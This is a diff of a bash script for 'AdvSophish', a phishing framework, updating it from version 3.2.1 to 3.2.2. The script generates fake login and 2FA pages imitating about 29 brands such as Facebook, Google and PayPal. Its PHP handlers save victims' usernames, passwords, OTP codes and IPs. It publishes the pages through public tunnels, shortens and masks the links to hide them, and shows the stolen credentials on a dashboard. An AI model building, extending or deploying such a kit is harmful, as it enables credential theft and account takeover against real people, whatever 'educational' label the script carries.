@@ -2,17 +2,17 @@
 
 ##   AdvSophish - Advanced Phishing Framework (Portable)
 ##   Author: mahi-cyberaware
-##   Version: 3.2.1
+##   Version: 3.2.2
 ##   GitHub: https://github.com/mahi-cyberaware/AdvSophish
 
-set -euo pipefail
+# No set -euo pipefail here – we handle errors manually for better portability
 trap 'kill_pid; reset_color' INT TERM EXIT
 
 # ------------------------------- Portable Base Dir -------------------------
 if command -v realpath &>/dev/null; then
-    BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+    BASE_DIR=$(realpath "$(dirname "$0")")
 else
-    BASE_DIR=$(cd "$(dirname "$BASH_SOURCE")" && pwd)
+    BASE_DIR=$(cd "$(dirname "$0")" && pwd)
 fi
 
 HOST='127.0.0.1'
@@ -21,25 +21,29 @@ DASHBOARD_PORT='8081'
 MASK_URL=""
 
 # ------------------------------- Safe Colors -------------------------------
-RED='\033[31m'
-GREEN='\033[32m'
-ORANGE='\033[33m'
-BLUE='\033[34m'
-CYAN='\033[36m'
-WHITE='\033[37m'
-RESET='\033[0m'
-
-if ! command -v tput &>/dev/null; then
-    reset_color() { printf "%b" "$RESET"; }
+if [[ -t 1 ]]; then
+    RED='\033[31m'; GREEN='\033[32m'; ORANGE='\033[33m'
+    BLUE='\033[34m'; CYAN='\033[36m'; WHITE='\033[37m'; RESET='\033[0m'
 else
-    reset_color() { tput sgr0; tput op 2>/dev/null || true; }
+    RED=''; GREEN=''; ORANGE=''; BLUE=''; CYAN=''; WHITE=''; RESET=''
+fi
+
+reset_color() { printf "%b" "$RESET"; }
+if command -v tput &>/dev/null; then
+    # Use tput only if available and no error
+    tput sgr0 2>/dev/null || true
+    tput op 2>/dev/null || true
 fi
 
 # ------------------------------- Create directories -------------------------
-mkdir -p "$BASE_DIR/.server/www" "$BASE_DIR/auth" "$BASE_DIR/dashboard/assets"
+mkdir -p "$BASE_DIR/.server/www" "$BASE_DIR/auth" "$BASE_DIR/dashboard" 2>/dev/null || true
 
 # ------------------------------- Helper Functions --------------------------
-kill_pid() { for proc in php cloudflared loclx; do pkill -f "$proc" 2>/dev/null; done; }
+kill_pid() {
+    for proc in php cloudflared loclx; do
+        pkill -f "$proc" 2>/dev/null || true
+    done
+}
 
 banner() {
     clear
@@ -49,38 +53,40 @@ banner() {
 		${ORANGE}  / _ \ | |   | |       | | | '_ \| / __| '_ \ 
 		${ORANGE} / ___ \| |___| |___    | | | | | | \__ \ | | |
 		${ORANGE}/_/   \_\_____|_____|   |_| |_| |_|_|___/_| |_|
-		${ORANGE}                AdvSophish ${RED}Version : 3.2.1
+		${ORANGE}                AdvSophish ${RED}Version : 3.2.2
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Advanced Phishing Framework - mahi-cyberaware${RESET}
 	EOF
 }
 
-dependencies() {
-    echo -e "\n${GREEN}[+]${CYAN} Checking dependencies..."
+# ------------------------------- Dependency Check (no auto‑install) ------
+check_dependencies() {
+    echo -e "\n${GREEN}[+]${CYAN} Checking required tools...${RESET}"
     local missing=()
     command -v php &>/dev/null || missing+=("php")
     command -v curl &>/dev/null || missing+=("curl")
     command -v unzip &>/dev/null || missing+=("unzip")
-    if [[ ${#missing[@]} -eq 0 ]]; then
-        echo -e "${GREEN}[+] All dependencies OK.${RESET}"
-        return
-    fi
-    echo -e "${ORANGE}[!] Missing: ${missing[*]}${RESET}"
-    if command -v apt &>/dev/null; then
-        apt update && apt install -y "${missing[@]}"
-    elif command -v pkg &>/dev/null; then
-        pkg install -y "${missing[@]}"
-    elif command -v pacman &>/dev/null; then
-        pacman -S --noconfirm "${missing[@]}"
-    else
-        echo -e "${RED}[-] No supported package manager. Install ${missing[*]} manually.${RESET}"
+    
+    if [[ ${#missing[@]} -gt 0 ]]; then
+        echo -e "${RED}[-] Missing: ${missing[*]}${RESET}"
+        echo -e "${ORANGE}[!] Please install them manually (e.g., 'sudo apt install php curl unzip' or 'pkg install php curl unzip')${RESET}"
         exit 1
     fi
+    echo -e "${GREEN}[+] All required tools present.${RESET}"
+}
+
+# ------------------------------- Binary Downloaders -----------------------
+download_binary() {
+    local url="$1" output="$2"
+    echo -e "${GREEN}[+] Downloading $output...${RESET}"
+    curl -L --silent --insecure --fail --retry 2 -o "$output" "$url"
+    chmod +x "$output"
 }
 
 install_cloudflared() {
     [[ -x ".server/cloudflared" ]] && return
-    echo -e "\n${GREEN}[+]${CYAN} Installing Cloudflared..."
+    mkdir -p .server
+    local arch
     arch=$(uname -m)
     case $arch in
         armv7l|armv8l) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" ;;
@@ -88,13 +94,13 @@ install_cloudflared() {
         x86_64)        url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
         *)             url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" ;;
     esac
-    curl -L --silent --insecure --fail --retry 2 -o ".server/cloudflared" "$url"
-    chmod +x ".server/cloudflared"
+    download_binary "$url" ".server/cloudflared"
 }
 
 install_localxpose() {
     [[ -x ".server/loclx" ]] && return
-    echo -e "\n${GREEN}[+]${CYAN} Installing LocalXpose..."
+    mkdir -p .server
+    local arch
     arch=$(uname -m)
     case $arch in
         armv7l|armv8l) url="https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" ;;
@@ -102,55 +108,25 @@ install_localxpose() {
         x86_64)        url="https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" ;;
         *)             url="https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" ;;
     esac
-    curl -L --silent --insecure --fail --retry 2 -o ".server/loclx.zip" "$url"
-    unzip -qq ".server/loclx.zip" -d ".server/"
-    mv ".server/loclx"* ".server/loclx" 2>/dev/null
+    local zipfile=".server/loclx.zip"
+    curl -L --silent --insecure --fail --retry 2 -o "$zipfile" "$url"
+    unzip -qq "$zipfile" -d ".server/"
+    mv .server/loclx_* .server/loclx 2>/dev/null || true
     chmod +x ".server/loclx"
-    rm -f ".server/loclx.zip"
+    rm -f "$zipfile"
 }
 
-# ------------------------------- Auto Template Generator (Full Sites) -----
-generate_all_sites() {
-    echo -e "${GREEN}[+] Generating all 35+ phishing templates with original logos...${RESET}"
+# ------------------------------- Site Templates (no associative arrays) ----
+generate_site() {
+    local site_id="$1"
+    local name="$2"
+    local color="$3"
+    local icon="$4"
+    local site_dir=".sites/$site_id"
+    [[ -d "$site_dir" ]] && return
+    mkdir -p "$site_dir"
     
-    declare -A SITE_STYLES
-    SITE_STYLES["tiktok"]="TikTok|#010101|fab fa-tiktok"
-    SITE_STYLES["facebook_tfo"]="Facebook|#1877f2|fab fa-facebook"
-    SITE_STYLES["instagram_tfo"]="Instagram|#e4405f|fab fa-instagram"
-    SITE_STYLES["ubereats_tfo"]="Uber Eats|#06c167|fas fa-utensils"
-    SITE_STYLES["aijo_tfo"]="Aijo|#ff9900|fas fa-ad"
-    SITE_STYLES["google_tfo"]="Google|#4285f4|fab fa-google"
-    SITE_STYLES["twitch_tfo"]="Twitch|#9146ff|fab fa-twitch"
-    SITE_STYLES["netflix_tfo"]="Netflix|#e50914|fab fa-netflix"
-    SITE_STYLES["instagram_followers"]="Instagram Followers|#e4405f|fab fa-instagram"
-    SITE_STYLES["amazon_tfo"]="Amazon|#ff9900|fab fa-amazon"
-    SITE_STYLES["whatsapp_tfo"]="WhatsApp|#25d366|fab fa-whatsapp"
-    SITE_STYLES["linkedin_tfo"]="LinkedIn|#0077b5|fab fa-linkedin"
-    SITE_STYLES["hotstar_tfo"]="Hotstar|#ff5e00|fas fa-tv"
-    SITE_STYLES["spotify_tfo"]="Spotify|#1db954|fab fa-spotify"
-    SITE_STYLES["github_tfo"]="GitHub|#333|fab fa-github"
-    SITE_STYLES["mobikwik_tfo"]="Mobikwik|#ff6200|fas fa-wallet"
-    SITE_STYLES["zomato_tfo"]="Zomato|#cb202d|fas fa-utensils"
-    SITE_STYLES["phonepay_tfo"]="PhonePe|#5f259f|fas fa-phone-alt"
-    SITE_STYLES["paypal_tfo"]="PayPal|#00457c|fab fa-paypal"
-    SITE_STYLES["telegram_tfo"]="Telegram|#26a5e4|fab fa-telegram"
-    SITE_STYLES["twitter_tfo"]="Twitter|#1da1f2|fab fa-twitter"
-    SITE_STYLES["flipcart_tfo"]="Flipkart|#2874f0|fab fa-opencart"
-    SITE_STYLES["wordpress"]="WordPress|#21759b|fab fa-wordpress"
-    SITE_STYLES["snapchat_tfo"]="Snapchat|#fffc00|fab fa-snapchat-ghost"
-    SITE_STYLES["protonmail_tfo"]="ProtonMail|#6d4aff|fas fa-envelope"
-    SITE_STYLES["stackoverflow"]="StackOverflow|#f48024|fab fa-stack-overflow"
-    SITE_STYLES["ebay_tfo"]="eBay|#e53238|fab fa-ebay"
-    SITE_STYLES["pinterest"]="Pinterest|#bd081c|fab fa-pinterest"
-    SITE_STYLES["cryptocurrency"]="Crypto|#f2a900|fab fa-bitcoin"
-
-    for site_id in "${!SITE_STYLES[@]}"; do
-        IFS='|' read -r name color icon <<< "${SITE_STYLES[$site_id]}"
-        local site_dir=".sites/$site_id"
-        [[ -d "$site_dir" ]] && continue
-        mkdir -p "$site_dir"
-        
-        cat > "$site_dir/style.css" <<-CSS
+    cat > "$site_dir/style.css" <<-CSS
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
 body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
 .card { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; padding: 20px; text-align: center; }
@@ -161,7 +137,7 @@ button { background: $color; border: none; color: white; font-size: 20px; font-w
 .footer { margin-top: 20px; color: #777; font-size: 14px; }
 CSS
 
-        cat > "$site_dir/index.html" <<-HTML
+    cat > "$site_dir/index.html" <<-HTML
 <!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>$name - Sign In</title>
@@ -176,7 +152,7 @@ CSS
 </body></html>
 HTML
 
-        cat > "$site_dir/login.php" <<-PHP
+    cat > "$site_dir/login.php" <<-PHP
 <?php
 \$data = "$site_id|" . \$_POST['username'] . "|" . \$_POST['password'] . "|" . date('Y-m-d H:i:s');
 file_put_contents('../../auth/usernames.dat', \$data . PHP_EOL, FILE_APPEND);
@@ -184,14 +160,14 @@ header('Location: otp.html');
 exit;
 PHP
 
-        cat > "$site_dir/otp.html" <<-HTML
+    cat > "$site_dir/otp.html" <<-HTML
 <!DOCTYPE html>
 <html><head><title>2FA Verification</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"><link rel="stylesheet" href="style.css"></head>
 <body><div class="card"><div class="logo"><i class="fas fa-shield-alt"></i></div><h2>Two‑Factor Authentication</h2><p>Enter the 6-digit code from your authenticator app.</p>
 <form method="POST" action="otp.php"><input type="text" name="otp" placeholder="000000" required maxlength="6"><button type="submit">Verify</button></form></div></body></html>
 HTML
 
-        cat > "$site_dir/otp.php" <<-PHP
+    cat > "$site_dir/otp.php" <<-PHP
 <?php
 \$data = "$site_id|" . \$_POST['otp'] . "|" . date('Y-m-d H:i:s');
 file_put_contents('../../auth/otp.dat', \$data . PHP_EOL, FILE_APPEND);
@@ -199,19 +175,56 @@ header('Location: https://www.google.com');
 exit;
 PHP
 
-        cat > "$site_dir/ip.php" <<-'PHP'
-<?php $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown'; file_put_contents('ip.txt', "IP: $ip - " . date('Y-m-d H:i:s') . PHP_EOL, FILE_APPEND); ?>
+    cat > "$site_dir/ip.php" <<-PHP
+<?php \$ip = \$_SERVER['REMOTE_ADDR'] ?? 'unknown'; file_put_contents('ip.txt', "IP: \$ip - " . date('Y-m-d H:i:s') . PHP_EOL, FILE_APPEND); ?>
 PHP
 
-        echo -e "${GREEN}[✓] Generated $site_id ($name)${RESET}"
-    done
+    echo -e "${GREEN}[✓] Generated $site_id ($name)${RESET}"
+}
+
+generate_all_sites() {
+    echo -e "${GREEN}[+] Generating all phishing templates...${RESET}"
+    # List: id|name|color|icon
+    while IFS='|' read -r id name color icon; do
+        generate_site "$id" "$name" "$color" "$icon"
+    done <<-EOF
+tiktok|TikTok|#010101|fab fa-tiktok
+facebook_tfo|Facebook|#1877f2|fab fa-facebook
+instagram_tfo|Instagram|#e4405f|fab fa-instagram
+ubereats_tfo|Uber Eats|#06c167|fas fa-utensils
+aijo_tfo|Aijo|#ff9900|fas fa-ad
+google_tfo|Google|#4285f4|fab fa-google
+twitch_tfo|Twitch|#9146ff|fab fa-twitch
+netflix_tfo|Netflix|#e50914|fab fa-netflix
+instagram_followers|Instagram Followers|#e4405f|fab fa-instagram
+amazon_tfo|Amazon|#ff9900|fab fa-amazon
+whatsapp_tfo|WhatsApp|#25d366|fab fa-whatsapp
+linkedin_tfo|LinkedIn|#0077b5|fab fa-linkedin
+hotstar_tfo|Hotstar|#ff5e00|fas fa-tv
+spotify_tfo|Spotify|#1db954|fab fa-spotify
+github_tfo|GitHub|#333333|fab fa-github
+mobikwik_tfo|Mobikwik|#ff6200|fas fa-wallet
+zomato_tfo|Zomato|#cb202d|fas fa-utensils
+phonepay_tfo|PhonePe|#5f259f|fas fa-phone-alt
+paypal_tfo|PayPal|#00457c|fab fa-paypal
+telegram_tfo|Telegram|#26a5e4|fab fa-telegram
+twitter_tfo|Twitter|#1da1f2|fab fa-twitter
+flipcart_tfo|Flipkart|#2874f0|fab fa-opencart
+wordpress|WordPress|#21759b|fab fa-wordpress
+snapchat_tfo|Snapchat|#fffc00|fab fa-snapchat-ghost
+protonmail_tfo|ProtonMail|#6d4aff|fas fa-envelope
+stackoverflow|StackOverflow|#f48024|fab fa-stack-overflow
+ebay_tfo|eBay|#e53238|fab fa-ebay
+pinterest|Pinterest|#bd081c|fab fa-pinterest
+cryptocurrency|Crypto Currency|#f2a900|fab fa-bitcoin
+EOF
 }
 
 # ------------------------------- Phishing Engine --------------------------
 setup_site() {
     local site_id="$1"
     generate_all_sites
-    rm -rf ".server/www"/*
+    rm -rf ".server/www"/* 2>/dev/null || true
     cp -rf ".sites/$site_id"/* ".server/www/"
     cd ".server/www"
     php -S "$HOST":"$PORT" >/dev/null 2>&1 &
@@ -228,11 +241,16 @@ capture_data() {
 
 obfuscate_url() {
     local long_url="$1"
-    local short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$long_url" 2>/dev/null)
-    [[ -z "$short_url" || "$short_url" == *"Error"* ]] && short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$long_url" 2>/dev/null)
+    local short_url
+    short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$long_url" 2>/dev/null)
+    if [[ -z "$short_url" || "$short_url" == *"Error"* ]]; then
+        short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$long_url" 2>/dev/null)
+    fi
     [[ -z "$short_url" ]] && short_url="$long_url"
     echo -e "${GREEN}Shortened: ${CYAN}$short_url${RESET}"
-    [[ -n "$MASK_URL" ]] && echo -e "${GREEN}Masked: ${CYAN}${MASK_URL}@${short_url#https://}${RESET}"
+    if [[ -n "$MASK_URL" ]]; then
+        echo -e "${GREEN}Masked: ${CYAN}${MASK_URL}@${short_url#https://}${RESET}"
+    fi
 }
 
 # ------------------------------- Tunnels -----------------------------------
@@ -243,7 +261,10 @@ start_cloudflared() {
     ./.server/cloudflared tunnel --url "$HOST:$port" --logfile ".server/.cld.log" >/dev/null 2>&1 &
     sleep 8
     url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" | head -1)
-    [[ -z "$url" ]] && { echo -e "${RED}[-] Cloudflared failed.${RESET}"; exit 1; }
+    if [[ -z "$url" ]]; then
+        echo -e "${RED}[-] Cloudflared failed.${RESET}"
+        exit 1
+    fi
     obfuscate_url "$url"
     capture_data
 }
@@ -255,7 +276,10 @@ start_localxpose() {
     ./.server/loclx tunnel --raw-mode http --https-redirect -t "$HOST:$port" > ".server/.loclx" 2>&1 &
     sleep 12
     url=$(grep -o '[0-9a-zA-Z.]*\.loclx.io' ".server/.loclx" | head -1)
-    [[ -z "$url" ]] && { echo -e "${RED}[-] LocalXpose failed.${RESET}"; exit 1; }
+    if [[ -z "$url" ]]; then
+        echo -e "${RED}[-] LocalXpose failed.${RESET}"
+        exit 1
+    fi
     obfuscate_url "https://$url"
     capture_data
 }
@@ -279,7 +303,7 @@ $creds = []; $otps = [];
 if (file_exists($creds_file)) { $lines = file($creds_file, FILE_IGNORE_NEW_LINES); foreach ($lines as $line) { $d = explode('|', $line); if (count($d)>=4) $creds[] = ['site'=>$d[0],'user'=>$d[1],'pass'=>$d[2],'time'=>$d[3]]; } }
 if (file_exists($otp_file)) { $lines = file($otp_file, FILE_IGNORE_NEW_LINES); foreach ($lines as $line) { $d = explode('|', $line); if (count($d)>=3) $otps[] = ['site'=>$d[0],'otp'=>$d[1],'time'=>$d[2]]; } }
 if (isset($_GET['del'])) { if ($_GET['del']=='creds') file_put_contents($creds_file,''); if ($_GET['del']=='otp') file_put_contents($otp_file,''); header('Location: index.php'); exit; }
-?><!DOCTYPE html><html><head><title>AdvSophish Dashboard</title><style>body{background:#0a0e1a;color:#eee;font-family:monospace;padding:20px;}.container{max-width:1400px;margin:auto;background:#161c2c;border-radius:12px;padding:20px;}h1{color:#ff9800;}table{width:100%;border-collapse:collapse;margin-top:20px;}th,td{padding:10px;text-align:left;border-bottom:1px solid #2a3246;}th{background:#0f1422;}.btn{background:#2a3a5a;color:white;padding:8px 16px;text-decoration:none;border-radius:6px;margin-right:10px;}.btn-danger{background:#a12a2a;}</style></head><body><div class=container><h1>AdvSophish Dashboard</h1><div><a class=btn href="?del=creds">Clear Credentials</a><a class=btn href="?del=otp">Clear OTPs</a></div><h2>Credentials (<?=count($creds)?>)</h2><table><tr><th>Site</th><th>Username</th><th>Password</th><th>Time</th></tr><?php foreach($creds as $c) echo "<tr><td>{$c['site']}</td><td>{$c['user']}</td><td>{$c['pass']}</td><td>{$c['time']}</td></tr>"; ?></table><h2>OTPs (<?=count($otps)?>)</h2><table><tr><th>Site</th><th>OTP</th><th>Time</th></tr><?php foreach($otps as $o) echo "<tr><td>{$o['site']}</td><td>{$o['otp']}</td><td>{$o['time']}</td></tr>"; ?></table></div></body></html>
+?><!DOCTYPE html><html><head><title>AdvSophish Dashboard</title><style>body{background:#0a0e1a;color:#eee;font-family:monospace;padding:20px;}.container{max-width:1400px;margin:auto;background:#161c2c;border-radius:12px;padding:20px;}h1{color:#ff9800;}table{width:100%;border-collapse:collapse;margin-top:20px;}th,td{padding:10px;text-align:left;border-bottom:1px solid #2a3246;}th{background:#0f1422;}.btn{background:#2a3a5a;color:white;padding:8px 16px;text-decoration:none;border-radius:6px;margin-right:10px;}.btn-danger{background:#a12a2a;}</style></head><body><div class=container><h1>AdvSophish Dashboard</h1><div><a class=btn href="?del=creds">Clear Credentials</a><a class=btn href="?del=otp">Clear OTPs</a></div><h2>Credentials (<?=count($creds)?>)</h2><table><tr><th>Site</th><th>Username</th><th>Password</th><th>Time</th></tr><?php foreach($creds as $c) echo "<tr><td>{$c['site']}</td><td>{$c['user']}</td><td>{$c['pass']}</td><td>{$c['time']}</td></tr>"; ?></table><h2>OTPs (<?=count($otps)?>)</h2><tr><tr><th>Site</th><th>OTP</th><th>Time</th></tr><?php foreach($otps as $o) echo "<tr><td>{$o['site']}</td><td>{$o['otp']}</td><td>{$o['time']}</td></tr>"; ?></table></div></body></html>
 DASH
     fi
     echo -e "\n${GREEN}[+] Starting dashboard on port $DASHBOARD_PORT ...${RESET}"
@@ -305,9 +329,9 @@ show_menu() {
     echo -e "\n${ORANGE}Available Phishing Targets:${RESET}"
     local i=1
     for id in "${SITE_IDS[@]}"; do
-        name=$(echo $id | tr '_' ' ' | sed 's/tfo//g' | sed 's/_/ /g' | awk '{for(j=1;j<=NF;j++) $j=toupper(substr($j,1,1)) tolower(substr($j,2))}1')
+        name=$(echo "$id" | tr '_' ' ' | sed 's/tfo//g' | sed 's/_/ /g' | awk '{for(j=1;j<=NF;j++) $j=toupper(substr($j,1,1)) tolower(substr($j,2))}1')
         printf "${RED}[${WHITE}%02d${RED}]${ORANGE} %-18s" $i "$name"
-        (( i % 3 == 0 )) && echo
+        if (( i % 3 == 0 )); then echo; fi
         ((i++))
     done
     echo -e "\n${RED}[${WHITE}88${RED}]${ORANGE} Dashboard"
@@ -322,7 +346,7 @@ main_menu() {
     case $choice in
         00) echo -e "\n${GREEN}Exiting...${RESET}"; kill_pid; exit 0 ;;
         88) start_dashboard; main_menu; return ;;
-        99) banner; echo -e "${CYAN}Author: mahi-cyberaware\nGitHub: https://github.com/mahi-cyberaware/AdvSophish\nVersion: 3.2.1\nLicense: Educational only${RESET}"; read -n1; main_menu; return ;;
+        99) banner; echo -e "${CYAN}Author: mahi-cyberaware\nGitHub: https://github.com/mahi-cyberaware/AdvSophish\nVersion: 3.2.2\nLicense: Educational only${RESET}"; read -n1; main_menu; return ;;
         *)
             if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#SITE_IDS[@]} )); then
                 SELECTED_SITE="${SITE_IDS[$((choice-1))]}"
@@ -343,7 +367,7 @@ tunnel_menu() {
     local port=$PORT
     if [[ $custom =~ ^[Yy]$ ]]; then
         read -p "Enter port (1024-65535): " port
-        [[ $port -lt 1024 || $port -gt 65535 ]] && port=8080
+        if [[ $port -lt 1024 || $port -gt 65535 ]]; then port=8080; fi
     fi
     case $tun in
         1|01) start_localhost "$SELECTED_SITE" "$port" ;;
@@ -355,6 +379,6 @@ tunnel_menu() {
 
 # ------------------------------- Start -------------------------------------
 kill_pid
-dependencies
+check_dependencies
 generate_all_sites
 main_menu
